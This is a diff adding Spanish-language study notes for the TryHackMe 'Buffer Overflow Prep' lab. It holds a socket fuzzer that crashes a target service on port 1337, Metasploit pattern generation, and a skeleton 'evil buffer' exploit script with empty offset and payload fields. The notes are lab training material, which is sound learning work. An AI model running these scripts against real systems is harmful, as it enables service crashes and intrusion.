@@ -404,7 +404,93 @@ while True:
 		sys.exit()
 ```
 
+## Tryhackme Buffer Overflow Prep
 
+En este caso se van a documentar los pasos que se utilizan para sacar los offsets y los badchars.
+
+```bash
+!mona config -set workingfolder c:\mona\%p
+
+```
+
+Primero se configura el directorio de trabajo de mona en este caso le % es para decir que cree una carpeta de acuerdo al nombre del ejectable en este caso oscp.exe entonces va a crear una carpeta llamada oscp.Se asume que ya tenemos la funcion vulnerable( hay que practicar esto). vamos a usar un script para fuzzear y ver donde el programa crashea. fuzzer.py 
+
+```python3
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "10.10.238.47"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW9 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+
+
+```
+
+Estoy resolviendo el OVERFLOW9 en esta funcion el programa crashea en el 1600 entonces podriamos generar un patron de 1700 en adelante...
+
+![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/ed4e1a57-5d56-4ca3-8b6c-739352784f0c)
+
+Para crear un patron vamos a usar una herramienta de metasploit.
+
+```bash 
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700
+```
+
+![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/cbcb1b9f-dc0a-4340-8c9a-653e9b427a16)
+
+
+Para ingresar los datos nos vamos a ayudar del siguiente script (que es el que yo recomiendo que se use siempre). eip.py
+
+```python3
+import socket
+
+ip = "10.10.176.71"
+port = 1337
+
+prefix = "OVERFLOW9 "
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+
+```
+
+Este script se va a ir modificando a necesidad por ejemplo para encontrar el offset vamos a enviar el patron que generamos lo ponemos en el payload
 
 
 
